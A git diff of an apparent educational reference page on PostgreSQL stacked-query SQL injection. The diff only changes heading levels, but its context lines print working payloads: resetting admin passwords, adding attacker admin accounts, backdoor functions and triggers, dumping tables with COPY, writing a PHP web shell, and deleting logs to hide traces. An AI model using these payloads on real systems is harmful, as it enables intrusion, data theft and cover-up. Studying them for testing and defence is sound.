@@ -7,11 +7,9 @@ tags: ["stacked queries", "multiple statements", "advanced injection"]
 lastUpdated: 2025-12-07
 ---
 
-## Stacked Queries
-
 Stacked queries (also known as query stacking or multi-queries) allow attackers to execute multiple SQL statements in a single injection. PostgreSQL fully supports stacked queries, making it a powerful target for this technique.
 
-### Basic Syntax
+## Basic Syntax
 
 In PostgreSQL, multiple SQL statements are separated by semicolons (`;`):
 
@@ -19,7 +17,7 @@ In PostgreSQL, multiple SQL statements are separated by semicolons (`;`):
 SELECT * FROM users; DROP TABLE users;
 ```
 
-### Detection
+## Detection
 
 To test if stacked queries are possible:
 
@@ -29,14 +27,14 @@ To test if stacked queries are possible:
 
 If the application pauses for 5 seconds, it likely supports stacked queries.
 
-### Prerequisites
+## Prerequisites
 
 Stacked queries work in PostgreSQL when:
 
 1. The database driver supports multiple statements
 2. The application doesn't filter semicolons
 
-### Driver Support
+## Driver Support
 
 | Driver                  | Multi-Statement | With Params | Notes                                             |
 | ----------------------- | --------------- | ----------- | ------------------------------------------------- |
@@ -53,35 +51,35 @@ Stacked queries work in PostgreSQL when:
 - **Client-side substitution** (psycopg2, psycopg3 ClientCursor): Parameters are substituted locally before sending SQL to server, so multi-statements work but this offers no SQL injection protection
 - **Server-side prepared statements** (psycopg3 with params, node-postgres with params, PHP `pg_query_params()`): PostgreSQL extended query protocol restricts to single statements; multi-statement queries are rejected
 
-### Examples of Stacked Queries
+## Examples of Stacked Queries
 
-#### Data Modification
+### Data Modification
 
 ```sql
 '; UPDATE users SET password='hacked' WHERE username='admin'--
 ```
 
-#### Creating New User
+### Creating New User
 
 ```sql
 '; INSERT INTO users (username, password, role) VALUES ('attacker', 'password123', 'admin')--
 ```
 
-#### Privilege Escalation
+### Privilege Escalation
 
 ```sql
 '; UPDATE users SET role='admin' WHERE username='guest'--
 ```
 
-#### Schema Manipulation
+### Schema Manipulation
 
 ```sql
 '; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255)--
 ```
 
-### Advanced Exploitation
+## Advanced Exploitation
 
-#### Creating Functions
+### Creating Functions
 
 ```sql
 '; CREATE OR REPLACE FUNCTION backdoor() RETURNS void AS $$
@@ -91,7 +89,7 @@ END;
 $$ LANGUAGE plpgsql--
 ```
 
-#### Creating Triggers
+### Creating Triggers
 
 ```sql
 '; CREATE TRIGGER evil_trigger
@@ -100,19 +98,19 @@ FOR EACH ROW
 EXECUTE FUNCTION backdoor()--
 ```
 
-#### Using COPY for Data Exfiltration
+### Using COPY for Data Exfiltration
 
 ```sql
 '; COPY (SELECT * FROM users) TO '/tmp/users.csv'--
 ```
 
-#### Writing Web Shells
+### Writing Web Shells
 
 ```sql
 '; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
 ```
 
-### Out-of-Band Data Extraction
+## Out-of-Band Data Extraction
 
 Using `COPY ... TO PROGRAM`:
 
@@ -122,7 +120,7 @@ Using `COPY ... TO PROGRAM`:
 
 **Privilege requirement:** `COPY ... TO PROGRAM` requires superuser privileges or membership in the `pg_execute_server_program` role (PostgreSQL 11+). This is typically unavailable in common SQL injection scenarios where the database user has restricted privileges.
 
-### Creating Roles
+## Creating Roles
 
 ```sql
 -- Create superuser (requires existing superuser privileges)
@@ -143,7 +141,7 @@ Using `COPY ... TO PROGRAM`:
 
 These stacked queries are not broadly exploitable without elevated privileges on the compromised database user.
 
-### Practical Attack Pattern
+## Practical Attack Pattern
 
 ```sql
 -- Comprehensive attack
@@ -159,20 +157,20 @@ DELETE FROM logs WHERE action LIKE '%backdoor%';
 --
 ```
 
-### Bypassing Filters
+## Bypassing Filters
 
 PostgreSQL requires semicolons as statement separators - newlines alone do not terminate statements. If semicolons are blocked, true stacked queries are not possible.
 
 However, you can encapsulate multiple statements within a function body using dollar-quoting:
 
-### Limitations
+## Limitations
 
 1. Some application frameworks explicitly disable multi-statement queries
 2. ORMs often prevent stacked queries
 3. Connection poolers may have restrictions
 4. WAFs may block semicolons in input
 
-### Mitigation
+## Mitigation
 
 To prevent stacked query attacks:
 
